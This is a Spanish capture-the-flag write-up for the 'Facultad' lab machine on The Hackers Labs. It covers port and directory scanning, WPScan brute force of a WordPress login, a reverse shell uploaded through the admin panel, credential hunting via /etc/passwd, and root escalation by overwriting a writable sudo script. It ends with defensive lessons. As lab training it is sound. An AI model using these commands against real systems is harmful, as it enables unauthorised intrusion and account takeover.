# Facultad

<img width="1350" height="630" alt="image" src="https://github.com/user-attachments/assets/e920e814-c9e6-4255-ad0b-8cb7c79f4f14" />
 
**Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 31/07/2026
 
## 0. Resumen
 
Máquina Linux de nivel principiante centrada en WordPress

El camino de explotación combina:
- Enumeración de directorios y descubrimiento de una instalación WordPress bajo `/education`
- Enumeración de usuarios y fuerza bruta de credenciales con WPScan
- Subida de una reverse shell desde el panel de administración de WordPress
- Localización de una contraseña cifrada en Brainfuck para escalar a un segundo usuario
- Escalada final a root abusando de un script ejecutable por sudo con permisos de escritura
  
## 1. Reconocimiento

   Ping

```bash
ping -c 2 <IP>
```

<img width="1087" height="131" alt="image" src="https://github.com/user-attachments/assets/30969626-0013-49da-92d2-bd455383f9da" />

→ TTL=64 sugiere que se trata de un host Linux
 
   Nmap
 
```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA facultad
```

| Orden | Función |
|---|---|
| `-sCV` | Ejecución de Scripts y detección de Versión de servicios |
| `-Pn` |  Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--open` | Muestra únicamente puertos abiertos |
| `-p-` | Escanea todos los puertos (65535) |
| `--min-rate` | Acelera escaneo enviando 5000 paquetes por segundo |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |
 
**Resultados:**
 
- Puerto 22: OpenSSH 9.2p1 (Debian 12)
  
- Puerto 80: Apache 2.4.62 (Debian)
   
## 2. Enumeración web

<img width="1360" height="584" alt="image" src="https://github.com/user-attachments/assets/03d05c1d-de03-4c8c-b3d0-4f13b885b055" />
 
### 2.1 Exploración manual
 
El título de la página principal ya menciona una asignatura universitaria (Administración de Sistemas), lo que confirma que la web es contenido genérico de fachada, sin funcionalidad relevante a la vista, por lo que el siguiente paso es fuzzing de directorios
 
### 2.2 Fuzzing de directorios
 
```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/directory-list-lowercase-2.3-medium.txt -x html,php,txt,py,sh
```
 
| Orden | Función |
|---|---|
| `-u` | URL objetivo |
| `-w` | Diccionario de rutas |
| `-x` | Extensiones a probar |

<img width="1072" height="191" alt="image" src="https://github.com/user-attachments/assets/31d2b9d0-f6a0-4e9c-bff2-ac90a2c16815" />
 
**Resultados de interés:**
 
- `/images`: (301) listado de imágenes
  
- `/education`: (301) Directorio que no corresponde a contenido únicamente estático

### 2.3 Configuración de DNS local y fuzzing sobre `/education`
 
```bash
echo "<IP> facultad.thl" | sudo tee -a /etc/hosts
```

Se añade la entrada correspondiente para resolver `facultad.thl`, con el objetivo de evitar problemas de virtual host, y se repite el fuzzing apuntando al subdirectorio `/education`

```bash
gobuster dir -u http://facultad.thl/education/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

<img width="1107" height="341" alt="image" src="https://github.com/user-attachments/assets/89f06489-81c2-49c3-8b32-0d8c8bff014a" />

**Resultados:**
 
- `/wp-content` (301)
  
- `/wp-admin` (301)
  
- `/wp-includes` (301)
  
- `wp-login.php` (200): Panel de login de Wordpress
  
- `readme.html` (200)
  
- `xmlrpc.php` (405)
  
→ La combinación de estas rutas confirma sin ambigüedad que `/education` es una instalación de WordPress, lo que redirige el resto del ataque hacia herramientas específicas de este CMS

## 3. Enumeración y explotación de WordPress
 
### 3.1 Análisis con WPScan
 
```bash
wpscan --url http://facultad.thl/education/ -e u,vp,vt
```
 
| Orden | Función |
|---|---|
| `-e u,vp,vt` | Enumera usuarios (`u`), plugins vulnerables (`vp`) y temas vulnerables (`vt`) |

<img width="1084" height="359" alt="image" src="https://github.com/user-attachments/assets/97f09462-5a1a-479e-8a56-139be26a3a92" />
 
**Hallazgos relevantes:**
 
- Versión de WordPress desactualizada (6.7.1)
  
- XML-RPC habilitado (`xmlrpc.php`)
  
- Dos entradas de usuario detectadas: `Facultad` y `facultad`

Confirmar la versión de WordPress y detectar XML-RPC activo justifica intentar un ataque de credenciales contra el propio panel de login, ya que es la superficie de ataque más directa cuando no hay plugins vulnerables evidentes.

### 3.2 Fuerza bruta de credenciales
 
```bash
wpscan --url http://facultad.thl/education/ --passwords /usr/share/wordlists/rockyou.txt --usernames Facultad,facultad
```
 
| Orden | Función |
|---|---|
| `--passwords` | Diccionario de contraseñas comunes |
| `--usernames` | Usuarios obtenidos en el paso de enumeración anterior, para acotar el ataque a candidatos reales |
 
→ Credenciales válidas: `facultad : asdfghjkl`

## 4. Explotación - Reverse shell desde WordPress
 
Con acceso al panel de administración, se aprovecha la funcionalidad de subida de archivos de WordPress (plugin de gestión de archivos - WP File Manager) para desplegar una reverse shell `shell.php` desde nuestra máquina atacante 

Se sube la shell (payload generado en revshells.com), preparamos el listener y se accede a ella desde el navegador mediante la ruta `http://facultad.thl/education/shell.php `
 
```bash
nc -lvnp 443
```
→ Se obtiene acceso como el usuario www-data

### 4.1 Tratamiento de la TTY
 
```bash
SHELL=/bin/bash script -q /dev/null
```
 
Seguido de `Ctrl+Z`
 
```bash
stty raw -echo && fg

reset

export TERM=xterm
```

Este tratamiento estabiliza la shell (autocompletado, señales, control de trabajos), necesario porque una reverse shell básica no dispone de una TTY completa

## 5. Post-explotación y de usuario
 
### 5.1 Enumeración de usuarios del sistema
 
```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
```
<img width="998" height="79" alt="image" src="https://github.com/user-attachments/assets/235636fc-52ad-4955-aabf-7a4f4014767f" />

→ Revela usuarios debian (UID 1000), gabri (UID 1001) y vivian (1002) ambos con shell /bin/sh y login interactivo

### 5.2 Búsqueda de credenciales en el correo de gabri

```bash
find / -user gabri 2>/dev/null
```

→ Se localiza el archivo `.password_vivian.bf` en la ruta `var/mail/gabri`, tal y como se especificaba en la información extraída de `facultad.jpg`, el cual contiene la contraseña del usuario `vivian` en texto cifrado en Brainfuck

### 5.3 Decodificación y cambio de usuario
 
El contenido se decodifica con cualquier decoder de Brainfuck online, revelando la contraseña de `vivian : lapatrona2025`
 
```bash
su vivian
```

## 6. Escalada de privilegios
 
### 6.1 Enumeración de privilegios sudo
 
```bash
sudo -l
```

<img width="1229" height="46" alt="image" src="https://github.com/user-attachments/assets/c5e25f42-bfd8-4738-aaab-d26df3823723" />
 
→ El usuario `vivian` puede ejecutar `/opt/vivian/script.sh` como root sin contraseña, y además tiene permisos de escritura sobre ese script

### 6.2 Explotación
 
Al poder modificar un script que root ejecutará vía sudo, basta con modificar su contenido
 
```bash
echo -e '#!/bin/bash\n/bin/bash' > /opt/vivian/script.sh

sudo /opt/vivian/script.sh
```
 
→ Al ejecutarse como `root`, el script lanza una shell con esos mismos privilegios

### 6.2 Primera flag (vivian)

```bash
cat /home/vivian/user.txt
```

### 6.3 Segunda flag (root)

```bash
cat /root/root.txt
```

## 8. Lecciones aprendidas

<img width="1138" height="541" alt="image" src="https://github.com/user-attachments/assets/17650a6f-c9e4-4e5b-a0a3-99261b98586c" />

- Un CMS como WordPress bajo un subdirectorio no evidente (`/education`) sigue siendo detectable por fuzzing; ocultar la ruta no sustituye una configuración de seguridad real
  
- Las contraseñas débiles en el panel de WordPress son vulnerables a fuerza bruta con WPScan, incluso con un solo intento de usuario conocido
  
- Cifrar una contraseña en Brainfuck (o cualquier esquema de "seguridad por oscuridad") no aporta protección real, ya que es trivialmente reversible con herramientas públicas
  
- Cualquier script permitido vía `sudo` debe ser inmutable para el usuario que lo ejecuta, ya que si el usuario puede escribir en el script, el control de sudo queda anulado por completo

